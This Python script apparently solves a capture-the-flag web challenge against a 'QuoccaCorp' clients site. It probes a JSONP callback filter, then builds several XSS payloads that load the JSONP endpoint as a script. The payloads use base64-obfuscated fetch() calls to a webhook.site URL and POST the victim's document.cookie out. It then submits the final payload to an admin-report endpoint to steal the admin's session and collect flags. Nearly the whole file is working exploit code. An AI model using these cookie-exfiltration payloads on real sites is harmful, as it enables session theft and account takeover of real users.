import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import string
import base64

BASE_URL = "https://clients.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def get_illegal_chars(self) -> list[str]:
        illegal_chars = []
        for char in string.printable:
            response = self.session.get(f"{BASE_URL}/clients.jsonp", params={"callback": char})
            if response.text == 'alert("illegal callback");':
                illegal_chars.append(char)

        return illegal_chars

    def main(self):
        fetch_url = f'''{self.webhooksite.url}?q='''
        fetch_url = f'''"{self.webhooksite.url}?q="+123'''
        fetch_url = f'''"{self.webhooksite.url}?q="+document.cookie'''
        fetch_url = f'''"{self.webhooksite.url}?q="+document["cookie"]'''
        fetch_url = self.webhooksite.url

        fetch_url_base64 = base64.b64encode(self.webhooksite.url.encode()).decode()

        CALLBACK_PAYLOAD = f'''(function(){{alert(1);}})'''
        CALLBACK_PAYLOAD = f'''(function(){{fetch({fetch_url});}})'''
        CALLBACK_PAYLOAD = f'''(function(){{fetch(atob("{fetch_url_base64}"));}})'''
        CALLBACK_PAYLOAD = f'''fetch(`${{eval(atob('{fetch_url_base64}'))}}`)'''
        CALLBACK_PAYLOAD = f'''fetch(`${{atob("{fetch_url_base64}")}}`,{{method:"POST",body:document["cookie"]}})'''
        CALLBACK_PAYLOAD = f'''fetch(atob("{fetch_url_base64}"),{{method:"POST",body:123}});'''
        CALLBACK_PAYLOAD = f'''(function(){{fetch(atob("{fetch_url_base64}"),{{method:"POST",body:123}})}})'''
        CALLBACK_PAYLOAD = f'''(function(){{fetch(atob('{fetch_url_base64}'),{{method:'POST',body:document['cookie']}})}})'''
        print(CALLBACK_PAYLOAD)


        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback=alert(1)"></script>'''
        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback=fetch(`${{atob('{fetch_url_base64}')}}`)"></script>'''
        PAYLOAD = f'''<script src="/clients.jsonp?q=x&callback={CALLBACK_PAYLOAD}"></script>''' #


        print(self.webhooksite.view_url)
        print(PAYLOAD)

        response = self.session.get(f"{BASE_URL}/clients.jsonp", params={
            'q': 'x',
            "callback": CALLBACK_PAYLOAD
        })

        print(response.request.url)
        print(response.text)

        # Report to Admin
        self.session.post(f"{BASE_URL}/report", data={'q': PAYLOAD})
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
